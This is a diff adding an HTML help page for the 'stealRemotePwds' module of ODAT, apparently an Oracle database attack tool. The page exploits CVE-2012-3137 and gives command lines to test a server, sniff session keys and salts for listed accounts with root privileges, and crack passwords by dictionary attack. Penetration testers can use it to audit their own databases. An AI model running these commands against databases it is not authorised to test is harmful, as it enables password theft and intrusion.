@@ -1,0 +1,21 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>stealremotepwds</title>
+</head><body>Exploit CVE-2012-3137 <br/>
+This module allows you to exploit the <a href="http://www.cvedetails.com/cve/CVE-2012-3137/">CVE-2012-3137</a>&nbsp;vulnerability easily.<br/>
+&nbsp;<br/>
+<b>Note</b>: Need <i>root</i>&nbsp;privileges in order to sniff session keys and salts from the network.<br/>
+&nbsp;<ul><li>&nbsp;To test if the remote database is vulnerable:</li>
+</ul>
+sudo ./odat.py stealRemotePwds -s $SERVER -d $ID -U $USER -P $PASSWORD --test-module <br/>
+<br/>
+With the previous command, ODAT tries to get the session key and salt. If it has these 2 values for the user given in command line (i.e. $USER), ODAT will try to decrypt the session key with your password given in command line (i.e. $PASSWORD). If the session id (value decrypted) starts with '\x08\x08\x08\x08\x08\x08\x08\x08', the password given (i.e. $PASSWORD) for this user (i.e. $USER) is valid: The target database is vulnerable to this CVE-2012-3137.<br/>
+&nbsp;<ul><li>&nbsp;To get session keys and salts of users stored in the <i>accounts_small.txt</i>&nbsp;file:</li>
+</ul>
+sudo ./odat.py stealRemotePwds -s $SERVER -d $ID --user-list accounts_small.txt --get-all-passwords <br/>
+<ul><li>&nbsp;To do a dictionary attack on session keys and salts:</li>
+</ul>
+sudo chmod o+r sessions-$SERVER-1521-$SID.txt; <br/>
+./odat.py stealRemotePwds -s $SERVER -d $SID --decrypt-sessions sessions-$SERVER-1521-$SID.txt test.txt &nbsp;</body></html>
